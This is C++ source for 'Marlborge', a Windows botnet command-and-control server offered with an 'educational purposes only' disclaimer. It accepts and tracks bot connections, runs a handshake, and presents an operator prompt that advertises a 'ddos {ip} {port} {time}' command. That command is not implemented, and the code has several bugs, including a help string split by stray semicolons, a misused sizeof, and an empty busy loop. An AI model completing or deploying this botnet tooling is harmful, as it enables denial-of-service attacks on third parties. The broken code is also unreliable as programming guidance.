#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <thread>
#include <mutex>
#include <map>
#include <time.h>
#include <string>

void ListenThread();
void ClientThread(SOCKET sock);

std::string GenRandStr(int nLength);

std::map<std::string, SOCKET> clients;
std::mutex clientsMutex;

#define IP_ADDR "127.0.0.1"
#define PORT 5000
#define MAXCONN 1200

#define HANDSHAKE 0x01

int main() {
	WSADATA wsa;
	int nRes = WSAStartup(MAKEWORD(2, 2), &wsa);

	if (nRes != 0) {
		std::cout << "[ERROR] An error occurred during WSAStartup." << std::endl;
		throw std::exception();
		return 1;
	}

	std::thread listenThread(ListenThread);
	listenThread.detach();
	
	std::cout <<
		"  __  __            _ _                          \n"
		" |  \\/  |          | | |                         \n"
		" | \\  / | __ _ _ __| | |__   ___  _ __ __ _  ___ \n"
		" | |\\/| |/ _` | '__| | '_ \\ / _ \\| '__/ _` |/ _ \\ \n"
		" | |  | | (_| | |  | | |_) | (_) | | | (_| |  __/\n"
		" |_|  |_|\\__,_|_|  |_|_.__/ \\___/|_|  \\__, |\\___|\n"
		"                                       __/ |     \n"
		"                                      |___/      \n\n";

	std::cout << "Welcome to Marlborge" << std::endl;
	std::cout << "Made for educational purposes only" << std::endl;
	std::cout << std::endl << "Github: https://github.com/PR3C14D0/Marlborge" << std::endl;
	std::cout << std::endl << "Type `help` for displaying all the commands" << std::endl;

	while (true) {
		std::cout << "root@marlborge:~# ";
		std::string option;
		std::getline(std::cin, option);
		std::cout << std::endl;

		if (option == "help") {
			std::cout << "Marlborge command list:\n"
				"1.- ddos {ip} {port} {time}\n";
				"2.- connected\n";
		}

		if (option == "connected") {
			UINT nClientCount = clients.size();
			std::cout << "Connected clients: " << nClientCount << std::endl;
		}
	}

	return 0;
}

void ListenThread() {
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (sock == INVALID_SOCKET) {
		std::cout << "[ERROR] An error occurred with our server socket initialization" << std::endl;
		throw std::exception();
		return;
	}

	SOCKADDR_IN saIn = { };
	saIn.sin_family = AF_INET;
	saIn.sin_port = htons(PORT);
	inet_pton(AF_INET, IP_ADDR, &saIn.sin_addr.s_addr);

	int nRes = bind(sock, (SOCKADDR*)&saIn, sizeof(saIn));
	if (nRes == SOCKET_ERROR) {
		std::cout << "[ERROR] Error binding our server socket." << std::endl;
		throw std::exception();
		return;
	}
	
	nRes = listen(sock, MAXCONN);

	if (nRes == SOCKET_ERROR) {
		std::cout << "[ERROR] Error listening on our server socket." << std::endl;
		throw std::exception();
		return;
	}

	bool bQuit = false;
	while (!bQuit) {
		SOCKADDR_IN clientInfo;
		int clientInfoSize = sizeof(clientInfo);
		SOCKET client = accept(sock, (SOCKADDR*)&clientInfo, &clientInfoSize);
		char chIpBuff[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &clientInfo.sin_addr.s_addr, chIpBuff, INET_ADDRSTRLEN);

		std::string clientIp(chIpBuff);

		clientsMutex.lock();
		clients[clientIp] = client;
		clientsMutex.unlock();

		std::thread clientThread(ClientThread, client);
		clientThread.detach();
	}
}

std::string GenRandStr(int nLength) {
	const std::string alphaNum =
		"0123456789"
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	std::string randStr;
	std::srand(time(nullptr));
	for (int i = 0; i < nLength; i++) {
		int nRandNum = rand() % (sizeof(alphaNum) - 1);
		randStr += alphaNum[nRandNum];
	}

	return randStr;
}

void ClientThread(SOCKET sock) {
	/* HANDSHAKE STAGE */
	char handshake[1];
	recv(sock, handshake, sizeof(handshake), 0);

	if (handshake[0] == HANDSHAKE) {
		std::string code = GenRandStr(16);
		char hsBuff[1024];
		int nBuffSize = 0;
		hsBuff[0] = HANDSHAKE;
		nBuffSize++;
		memcpy(&hsBuff[nBuffSize], code.data(), code.size());
		nBuffSize += code.size();
		send(sock, hsBuff, nBuffSize, 0);
	}

	bool bConnected = true;
	while (bConnected) {

	}
}